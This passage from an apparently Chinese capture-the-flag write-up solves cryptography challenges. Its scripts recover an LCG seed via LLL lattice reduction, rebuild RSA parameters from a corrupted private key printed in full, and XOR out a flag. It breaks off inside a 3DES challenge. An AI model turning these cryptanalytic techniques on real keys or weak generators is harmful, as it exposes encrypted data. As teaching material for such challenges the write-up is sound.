getRandomNBitInteger(<span class="hljs-number">240</span>)<br>    n = getPrime(<span class="hljs-number">512</span>)<br>    seed = m<br>    s = [<span class="hljs-number">0</span>] * <span class="hljs-number">6</span><br>    s[<span class="hljs-number">0</span>] = seed<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>):<br>        s[i] = (s[i - <span class="hljs-number">1</span>] * a + b) % n<br>    <span class="hljs-keyword">return</span> s<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt2</span>(<span class="hljs-params">msg, p, h</span>):<br>    s = getRandomNBitInteger(<span class="hljs-number">512</span>)<br>    c = (s * h + msg) % p<br>    <span class="hljs-keyword">return</span> c<br><br><br>s = encrypt1(m)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;S1 =&quot;</span>, s[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;S2 =&quot;</span>, s[<span class="hljs-number">2</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;S4 =&quot;</span>, s[<span class="hljs-number">4</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;S5 =&quot;</span>, s[<span class="hljs-number">5</span>])<br><br>p, h = get_key()<br>c = encrypt2(s[<span class="hljs-number">3</span>], p, h)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p =&quot;</span>, p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;h =&quot;</span>, h)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>, c)<br><br><span class="hljs-comment"># S1 = 28572152986082018877402362001567466234043851789360735202177142484311397443337910028526704343260845684960897697228636991096551426116049875141</span><br><span class="hljs-comment"># S2 = 1267231041216362976881495706209012999926322160351147349200659893781191687605978675590209327810284956626443266982499935032073788984220619657447889609681888</span><br><span class="hljs-comment"># S4 = 9739918644806242673966205531575183334306589742344399829232076845951304871478438938119813187502023845332528267974698273405630514228632721928260463654612997</span><br><span class="hljs-comment"># S5 = 9755668823764800147393276745829186812540710004256163127825800861195296361046987938775181398489372822667854079119037446327498475937494635853074634666112736</span><br><span class="hljs-comment"># p = 25886434964719448194352673440525701654705794467884891063997131230558866479588298264578120588832128279435501897537203249743883076992668855905005985050222145380285378634993563571078034923112985724204131887907198503097115380966366598622251191576354831935118147880783949022370177789175320661630501595157946150891275992785113199863734714343650596491139321990230671901990010723398037081693145723605154355325074739107535905777351</span><br><span class="hljs-comment"># h = 2332673914418001018316159191702497430320194762477685969994411366563846498561222483921873160125818295447435796015251682805613716554577537183122368080760105458908517619529332931042168173262127728892648742025494771751133664547888267249802368767396121189473647263861691578834674578112521646941677994097088669110583465311980605508259404858000937372665500663077299603396786862387710064061811000146453852819607311367850587534711</span><br><span class="hljs-comment"># c = 20329058681057003355767546524327270876901063126285410163862577312957425318547938475645814390088863577141554443432653658287774537679738768993301095388221262144278253212238975358868925761055407920504398004143126310247822585095611305912801250788531962681592054588938446210412897150782558115114462054815460318533279921722893020563472010279486838372516063331845966834180751724227249589463408168677246991839581459878242111459287</span><br></code></pre></td></tr></table></figure><h2 id="Part1：NTRU求S3"><a href="#Part1：NTRU求S3" class="headerlink" title="Part1：NTRU求S3"></a>Part1：NTRU求S3</h2><p>已知（1）$c\equiv sh + s_3 \mod p$<br>还有（2）$h \equiv f^{-1}*q \mod p$<br>（1）两边同时乘以$f$，有$cf\equiv sq + s_3f\mod p$<br>再对$q$取模得，$cf\equiv s_3f \mod q$，令$a&#x3D;cf$，则有$a\equiv s_3f \mod q$<br>因此我们要求$(f,q)$<br>根据$hf\equiv q\mod p$构造格：</p><span>$$(f,k)\begin{pmatrix}1 & h\\0 & p\end{pmatrix}=(f,q)$$</span><p>求得$s_3$</p><h2 id="Part2：LCG求seed"><a href="#Part2：LCG求seed" class="headerlink" title="Part2：LCG求seed"></a>Part2：LCG求seed</h2><p>利用已知连续5个序列值先求模$n$，方法如下：<br>$m&#x3D;gcd(t_{n+1}t_{n-1} - t_n^2,t_{n+2}t_{n} - t_{n+1}^2 )$<br>具体推导可以看我另一篇博客：<a href="https://ramoor.github.io/2025/04/08/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-LCG">Crypto基础篇-LCG Ramoor</a><br>再求$a,b,seed$即可<br><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>S1 = <span class="hljs-number">28572152986082018877402362001567466234043851789360735202177142484311397443337910028526704343260845684960897697228636991096551426116049875141</span><br>S2 = <span class="hljs-number">1267231041216362976881495706209012999926322160351147349200659893781191687605978675590209327810284956626443266982499935032073788984220619657447889609681888</span><br>S4 = <span class="hljs-number">9739918644806242673966205531575183334306589742344399829232076845951304871478438938119813187502023845332528267974698273405630514228632721928260463654612997</span><br>S5 = <span class="hljs-number">9755668823764800147393276745829186812540710004256163127825800861195296361046987938775181398489372822667854079119037446327498475937494635853074634666112736</span><br>p = <span class="hljs-number">25886434964719448194352673440525701654705794467884891063997131230558866479588298264578120588832128279435501897537203249743883076992668855905005985050222145380285378634993563571078034923112985724204131887907198503097115380966366598622251191576354831935118147880783949022370177789175320661630501595157946150891275992785113199863734714343650596491139321990230671901990010723398037081693145723605154355325074739107535905777351</span><br>h = <span class="hljs-number">2332673914418001018316159191702497430320194762477685969994411366563846498561222483921873160125818295447435796015251682805613716554577537183122368080760105458908517619529332931042168173262127728892648742025494771751133664547888267249802368767396121189473647263861691578834674578112521646941677994097088669110583465311980605508259404858000937372665500663077299603396786862387710064061811000146453852819607311367850587534711</span><br>c = <span class="hljs-number">20329058681057003355767546524327270876901063126285410163862577312957425318547938475645814390088863577141554443432653658287774537679738768993301095388221262144278253212238975358868925761055407920504398004143126310247822585095611305912801250788531962681592054588938446210412897150782558115114462054815460318533279921722893020563472010279486838372516063331845966834180751724227249589463408168677246991839581459878242111459287</span><br><br><br>M = Matrix(ZZ,[[<span class="hljs-number">1</span>,h],[<span class="hljs-number">0</span>,p]])<br>L = M.LLL()[<span class="hljs-number">0</span>]<br>f , q = L<br>f = <span class="hljs-built_in">abs</span>(f)<br>q = <span class="hljs-built_in">abs</span>(q)<br><span class="hljs-built_in">print</span>(f,q)<br>a = (c*f) %p<br>S3 = a*inverse(f,q)%q<br><span class="hljs-comment">#print(S3.nbits())</span><br><br><span class="hljs-comment">#求模n</span><br>X_seq=[S1,S2,S3,S4,S5]<br><br>t=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(X_seq)-<span class="hljs-number">1</span>):<br>t.append(X_seq[i+<span class="hljs-number">1</span>]-X_seq[i])<br><br>T=[]  <span class="hljs-comment">#T_i=T_ip2 * T_i - T_ip1**2 </span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(t)-<span class="hljs-number">2</span>):<br>T.append(t[i+<span class="hljs-number">2</span>]*t[i]-t[i+<span class="hljs-number">1</span>]**<span class="hljs-number">2</span>)<br><br>n=GCD(T[<span class="hljs-number">0</span>],T[<span class="hljs-number">1</span>]) <span class="hljs-comment">#n的候选值</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(T)):<br>    n=GCD(n,T[i])<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-comment">#求a,b,seed</span><br>a=inverse(S2-S1,n)*(S3-S2) %n<br>b=S2-a*S1 %n<br>m = inverse(a,n)*(S1-b) %n<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h1 id="XOR贯穿始终"><a href="#XOR贯穿始终" class="headerlink" title="XOR贯穿始终"></a>XOR贯穿始终</h1><p>massage.txt:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">自由和谐和谐富强公正友善爱国公正法治法治文明和谐自由法治自由法治平等公正友善公正公正民主法治自由公正敬业和谐富强公正友善爱国和谐平等平等友善敬业法治敬业和谐富强法治平等平等友善敬业公正公正公正友善敬业法治平等平等诚信自由公正自由平等友善敬业公正友善法治和谐和谐<br></code></pre></td></tr></table></figure><p>社会主义核心价值观编码解码得到</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">C0ngr4tulati0n5_y0u_fou^d_m3<br></code></pre></td></tr></table></figure><p>将其作为压缩包密码进行解压缩<br>pri.pem</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">-----BEGIN PRIVATE KEY-----<br>MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALmtMy+2uH1ZtbIL<br>SuiAukFthyQRH5mp7UmLyzZQkdg9zEP9/5tgffikQ7ytx5kHySHnazgAO1sOzmYE<br>N4Axlev6uafiP8B1Eij97v5VkYJ1I9e3mtBNheTbXKoT8op+ASQ1fQaF4A8UzLuW<br>eZeZI8JTH/SH+bolAK3kiZXDFdkTAgMBAAECgYEAl067LaC7Cvs2A5cMPhfYsESv<br>IgcKN1CwW4Sd3u8dSphhgu7TgyzIuvwxbuo2g1BC6WwKhaI6vGN+csfw6nh98GEn<br>/p3D0huNroAYvf/DRRB9UnHdttX7wB+Mv3P0RBDWHgBiCDVvHFuFUV78cIs0tnbn<br>jxjU07aPV2XRC3AfA2ECQQDqWUNPVg3i6vTyHCL7EGkbeUheYpAAfcKCQrxjc5+5<br>X6A+XtgHAA1JHwykPlCpHUOmlA85DJF1ejuoImzlgRLJAkEAytTCnQF+MN2r1gaA<br>UETZyj5qMYT7Th8zKEVVVJjDawLnuX4usJ2FyRnjCkk86U75QSJhw5mMc0QnG25u<br>Gz3++w==<br>-----END PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>task.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> gcd<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> enflag<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = q * p<br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>e = getPrime(<span class="hljs-number">17</span>)<br><span class="hljs-keyword">assert</span> gcd(e, phi) == <span class="hljs-number">1</span><br><span class="hljs-comment"># 以上信息生成了私钥文件,但文件被损坏了你能提取有用信息吗</span><br><br>c = <span class="hljs-built_in">pow</span>(enflag, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c = &#x27;</span> + <span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">c = 91817924748361493215143897386603397612753451291462468066632608541316135642691873237492166541761504834463859351830616117238028454453831120079998631107520871612398404926417683282285787231775479511469825932022611941912754602165499500350038397852503264709127650106856760043956604644700201911063515109074933378818</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>提示私钥文件被损坏，因此我们首先对私钥文件进行base64解码并转换为十六进制数据</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">30</span> <span class="hljs-number">82</span> <span class="hljs-number">02</span> <span class="hljs-number">77</span> <span class="hljs-number">02</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">30</span> <span class="hljs-number">0</span>d <span class="hljs-number">06</span> <span class="hljs-number">09</span> <span class="hljs-number">2</span>a <span class="hljs-number">86</span> <span class="hljs-number">48</span> <span class="hljs-number">86</span> f7 <span class="hljs-number">0</span>d <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">82</span> <span class="hljs-number">02</span> <span class="hljs-number">61</span> <span class="hljs-number">30</span> <span class="hljs-number">82</span> <span class="hljs-number">02</span> <span class="hljs-number">5</span>d <span class="hljs-number">02</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">02</span> <span class="hljs-number">81</span> <span class="hljs-number">81</span> <span class="hljs-number">00</span> b9 ad <span class="hljs-number">33</span> <span class="hljs-number">2</span>f b6 b8 <span class="hljs-number">7</span>d <span class="hljs-number">59</span> b5 b2 <span class="hljs-number">0</span>b <span class="hljs-number">4</span>a e8 <span class="hljs-number">80</span> ba <span class="hljs-number">41</span> <span class="hljs-number">6</span>d <span class="hljs-number">87</span> <span class="hljs-number">24</span> <span class="hljs-number">11</span> <span class="hljs-number">1</span>f <span class="hljs-number">99</span> a9 ed <span class="hljs-number">49</span> <span class="hljs-number">8</span>b cb <span class="hljs-number">36</span> <span class="hljs-number">50</span> <span class="hljs-number">91</span> d8 <span class="hljs-number">3</span>d cc <span class="hljs-number">43</span> fd ff <span class="hljs-number">9</span>b <span class="hljs-number">60</span> <span class="hljs-number">7</span>d f8 a4 <span class="hljs-number">43</span> bc ad c7 <span class="hljs-number">99</span> <span class="hljs-number">07</span> c9 <span class="hljs-number">21</span> e7 <span class="hljs-number">6</span>b <span class="hljs-number">38</span> <span class="hljs-number">00</span> <span class="hljs-number">3</span>b <span class="hljs-number">5</span>b <span class="hljs-number">0</span>e ce <span class="hljs-number">66</span> <span class="hljs-number">04</span> <span class="hljs-number">37</span> <span class="hljs-number">80</span> <span class="hljs-number">31</span> <span class="hljs-number">95</span> eb fa b9 a7 e2 <span class="hljs-number">3</span>f c0 <span class="hljs-number">75</span> <span class="hljs-number">12</span> <span class="hljs-number">28</span> fd ee fe <span class="hljs-number">55</span> <span class="hljs-number">91</span> <span class="hljs-number">82</span> <span class="hljs-number">75</span> <span class="hljs-number">23</span> d7 b7 <span class="hljs-number">9</span>a d0 <span class="hljs-number">4</span>d <span class="hljs-number">85</span> e4 db <span class="hljs-number">5</span>c aa <span class="hljs-number">13</span> f2 <span class="hljs-number">8</span>a <span class="hljs-number">7</span>e <span class="hljs-number">01</span> <span class="hljs-number">24</span> <span class="hljs-number">35</span> <span class="hljs-number">7</span>d <span class="hljs-number">06</span> <span class="hljs-number">85</span> e0 <span class="hljs-number">0</span>f <span class="hljs-number">14</span> cc bb <span class="hljs-number">96</span> <span class="hljs-number">79</span> <span class="hljs-number">97</span> <span class="hljs-number">99</span> <span class="hljs-number">23</span> c2 <span class="hljs-number">53</span> <span class="hljs-number">1</span>f f4 <span class="hljs-number">87</span> f9 ba <span class="hljs-number">25</span> <span class="hljs-number">00</span> ad e4 <span class="hljs-number">89</span> <span class="hljs-number">95</span> c3 <span class="hljs-number">15</span> d9 <span class="hljs-number">13</span> <span class="hljs-number">02</span> <span class="hljs-number">03</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">02</span> <span class="hljs-number">81</span> <span class="hljs-number">81</span> <span class="hljs-number">00</span> <span class="hljs-number">97</span> <span class="hljs-number">4</span>e bb <span class="hljs-number">2</span>d a0 bb <span class="hljs-number">0</span>a fb <span class="hljs-number">36</span> <span class="hljs-number">03</span> <span class="hljs-number">97</span> <span class="hljs-number">0</span>c <span class="hljs-number">3</span>e <span class="hljs-number">17</span> d8 b0 <span class="hljs-number">44</span> af <span class="hljs-number">22</span> <span class="hljs-number">07</span> <span class="hljs-number">0</span>a <span class="hljs-number">37</span> <span class="hljs-number">50</span> b0 <span class="hljs-number">5</span>b <span class="hljs-number">84</span> <span class="hljs-number">9</span>d de ef <span class="hljs-number">1</span>d <span class="hljs-number">4</span>a <span class="hljs-number">98</span> <span class="hljs-number">61</span> <span class="hljs-number">82</span> ee d3 <span class="hljs-number">83</span> <span class="hljs-number">2</span>c c8 ba fc <span class="hljs-number">31</span> <span class="hljs-number">6</span>e ea <span class="hljs-number">36</span> <span class="hljs-number">83</span> <span class="hljs-number">50</span> <span class="hljs-number">42</span> e9 <span class="hljs-number">6</span>c <span class="hljs-number">0</span>a <span class="hljs-number">85</span> a2 <span class="hljs-number">3</span>a bc <span class="hljs-number">63</span> <span class="hljs-number">7</span>e <span class="hljs-number">72</span> c7 f0 ea <span class="hljs-number">78</span> <span class="hljs-number">7</span>d f0 <span class="hljs-number">61</span> <span class="hljs-number">27</span> fe <span class="hljs-number">9</span>d c3 d2 <span class="hljs-number">1</span>b <span class="hljs-number">8</span>d ae <span class="hljs-number">80</span> <span class="hljs-number">18</span> bd ff c3 <span class="hljs-number">45</span> <span class="hljs-number">10</span> <span class="hljs-number">7</span>d <span class="hljs-number">52</span> <span class="hljs-number">71</span> dd b6 d5 fb c0 <span class="hljs-number">1</span>f <span class="hljs-number">8</span>c bf <span class="hljs-number">73</span> f4 <span class="hljs-number">44</span> <span class="hljs-number">10</span> d6 <span class="hljs-number">1</span>e <span class="hljs-number">00</span> <span class="hljs-number">62</span> <span class="hljs-number">08</span> <span class="hljs-number">35</span> <span class="hljs-number">6</span>f <span class="hljs-number">1</span>c <span class="hljs-number">5</span>b <span class="hljs-number">85</span> <span class="hljs-number">51</span> <span class="hljs-number">5</span>e fc <span class="hljs-number">70</span> <span class="hljs-number">8</span>b <span class="hljs-number">34</span> b6 <span class="hljs-number">76</span> e7 <span class="hljs-number">8</span>f <span class="hljs-number">18</span> d4 d3 b6 <span class="hljs-number">8</span>f <span class="hljs-number">57</span> <span class="hljs-number">65</span> d1 <span class="hljs-number">0</span>b <span class="hljs-number">70</span> <span class="hljs-number">1</span>f <span class="hljs-number">03</span> <span class="hljs-number">61</span> <span class="hljs-number">02</span> <span class="hljs-number">41</span> <span class="hljs-number">00</span> ea <span class="hljs-number">59</span> <span class="hljs-number">43</span> <span class="hljs-number">4</span>f <span class="hljs-number">56</span> <span class="hljs-number">0</span>d e2 ea f4 f2 <span class="hljs-number">1</span>c <span class="hljs-number">22</span> fb <span class="hljs-number">10</span> <span class="hljs-number">69</span> <span class="hljs-number">1</span>b <span class="hljs-number">79</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>e <span class="hljs-number">62</span> <span class="hljs-number">90</span> <span class="hljs-number">00</span> <span class="hljs-number">7</span>d c2 <span class="hljs-number">82</span> <span class="hljs-number">42</span> bc <span class="hljs-number">63</span> <span class="hljs-number">73</span> <span class="hljs-number">9</span>f b9 <span class="hljs-number">5</span>f a0 <span class="hljs-number">3</span>e <span class="hljs-number">5</span>e d8 <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>d <span class="hljs-number">49</span> <span class="hljs-number">1</span>f <span class="hljs-number">0</span>c a4 <span class="hljs-number">3</span>e <span class="hljs-number">50</span> a9 <span class="hljs-number">1</span>d <span class="hljs-number">43</span> a6 <span class="hljs-number">94</span> <span class="hljs-number">0</span>f <span class="hljs-number">39</span> <span class="hljs-number">0</span>c <span class="hljs-number">91</span> <span class="hljs-number">75</span> <span class="hljs-number">7</span>a <span class="hljs-number">3</span>b a8 <span class="hljs-number">22</span> <span class="hljs-number">6</span>c e5 <span class="hljs-number">81</span> <span class="hljs-number">12</span> c9 <span class="hljs-number">02</span> <span class="hljs-number">41</span> <span class="hljs-number">00</span> ca d4 c2 <span class="hljs-number">9</span>d <span class="hljs-number">01</span> <span class="hljs-number">7</span>e <span class="hljs-number">30</span> dd ab d6 <span class="hljs-number">06</span> <span class="hljs-number">80</span> <span class="hljs-number">50</span> <span class="hljs-number">44</span> d9 ca <span class="hljs-number">3</span>e <span class="hljs-number">6</span>a <span class="hljs-number">31</span> <span class="hljs-number">84</span> fb <span class="hljs-number">4</span>e <span class="hljs-number">1</span>f <span class="hljs-number">33</span> <span class="hljs-number">28</span> <span class="hljs-number">45</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">98</span> c3 <span class="hljs-number">6</span>b <span class="hljs-number">02</span> e7 b9 <span class="hljs-number">7</span>e <span class="hljs-number">2</span>e b0 <span class="hljs-number">9</span>d <span class="hljs-number">85</span> c9 <span class="hljs-number">19</span> e3 <span class="hljs-number">0</span>a <span class="hljs-number">49</span> <span class="hljs-number">3</span>c e9 <span class="hljs-number">4</span>e f9 <span class="hljs-number">41</span> <span class="hljs-number">22</span> <span class="hljs-number">61</span> c3 <span class="hljs-number">99</span> <span class="hljs-number">8</span>c <span class="hljs-number">73</span> <span class="hljs-number">44</span> <span class="hljs-number">27</span> <span class="hljs-number">1</span>b <span class="hljs-number">6</span>e <span class="hljs-number">6</span>e <span class="hljs-number">1</span>b <span class="hljs-number">3</span>d fe fb<br></code></pre></td></tr></table></figure><p>按照顺序各个部分得特点进行拆分：</p><ul><li><code>02 81 81</code>表示0x81即129字节的模数n：<code>00 b9 ad 33 2f b6 b8 7d 59 b5 b2 0b 4a e8 80 ba 41 6d 87 24 11 1f 99 a9 ed 49 8b cb 36 50 91 d8 3d cc 43 fd ff 9b 60 7d f8 a4 43 bc ad c7 99 07 c9 21 e7 6b 38 00 3b 5b 0e ce 66 04 37 80 31 95 eb fa b9 a7 e2 3f c0 75 12 28 fd ee fe 55 91 82 75 23 d7 b7 9a d0 4d 85 e4 db 5c aa 13 f2 8a 7e 01 24 35 7d 06 85 e0 0f 14 cc bb 96 79 97 99 23 c2 53 1f f4 87 f9 ba 25 00 ad e4 89 95 c3 15 d9 13</code></li><li><code>02 03</code>表示e：<code>01 00 01</code>即e&#x3D;65537</li><li><code>02 81 81</code>表示0x81即129字节的私钥指数d：<code>00 97 4e bb 2d a0 bb 0a fb 36 03 97 0c 3e 17 d8 b0 44 af 22 07 0a 37 50 b0 5b 84 9d de ef 1d 4a 98 61 82 ee d3 83 2c c8 ba fc 31 6e ea 36 83 50 42 e9 6c 0a 85 a2 3a bc 63 7e 72 c7 f0 ea 78 7d f0 61 27 fe 9d c3 d2 1b 8d ae 80 18 bd ff c3 45 10 7d 52 71 dd b6 d5 fb c0 1f 8c bf 73 f4 44 10 d6 1e 00 62 08 35 6f 1c 5b 85 51 5e fc 70 8b 34 b6 76 e7 8f 18 d4 d3 b6 8f 57 65 d1 0b 70 1f 03 61</code><br>使用脚本获取m：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">d = <span class="hljs-number">0x00974ebb2da0bb0afb3603970c3e17d8b044af22070a3750b05b849ddeef1d4a986182eed3832cc8bafc316eea36835042e96c0a85a23abc637e72c7f0ea787df06127fe9dc3d21b8dae8018bdffc345107d5271ddb6d5fbc01f8cbf73f44410d61e006208356f1c5b85515efc708b34b676e78f18d4d3b68f5765d10b701f0361</span><br>e = <span class="hljs-number">0x10001</span><br>n = <span class="hljs-number">0x00b9ad332fb6b87d59b5b20b4ae880ba416d8724111f99a9ed498bcb365091d83dcc43fdff9b607df8a443bcadc79907c921e76b38003b5b0ece660437803195ebfab9a7e23fc0751228fdeefe5591827523d7b79ad04d85e4db5caa13f28a7e0124357d0685e00f14ccbb9679979923c2531ff487f9ba2500ade48995c315d913</span><br>c = <span class="hljs-number">91817924748361493215143897386603397612753451291462468066632608541316135642691873237492166541761504834463859351830616117238028454453831120079998631107520871612398404926417683282285787231775479511469825932022611941912754602165499500350038397852503264709127650106856760043956604644700201911063515109074933378818</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>获取明文m：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">DASCTF&#123;<span class="hljs-number">0e287</span>wQ\<span class="hljs-keyword">x</span><span class="hljs-number">08</span>R\<span class="hljs-keyword">x</span><span class="hljs-number">17</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>FGXYFZ\<span class="hljs-keyword">x</span><span class="hljs-number">07</span>V\<span class="hljs-keyword">x</span><span class="hljs-number">03</span>kIUCn\<span class="hljs-keyword">x</span><span class="hljs-number">02</span>VDg\<span class="hljs-keyword">x</span><span class="hljs-number">01</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">0</span>cN<br></code></pre></td></tr></table></figure><p>发现后半段没正常显示，根据题目猜测需要将第一步得到的字符串和该串进行异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">b = <span class="hljs-string">b&#x27;C0ngr4tulati0n5_y0u_fou^d_m3&#x27;</span><br>ans = bytes_to_long(b)  ^ m<br><span class="hljs-built_in">print</span>(long_to_bytes(ans))<br></code></pre></td></tr></table></figure><p>得到：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">DASCTF</span>&#123;<span class="hljs-number">0</span>e2874af5e422482378640e61d919e9a&#125;<br></code></pre></td></tr></table></figure><h1 id="SigninCrypto"><a href="#SigninCrypto" class="headerlink" title="SigninCrypto"></a>SigninCrypto</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES3<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> key <span class="hljs-keyword">import</span> key<br><span class="hljs-keyword">from</span> iv <span class="hljs-keyword">import</span> iv<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> secrets<br><br>K1= key<br>hint1 = os.urandom(<span class="hljs-number">2</span>) * <span class="hljs-number">8</span><br>xor =bytes_to_long(hint1)^bytes_to_long(K1)<br><span class="hljs-built_in">print</span>(xor)<br><br><span 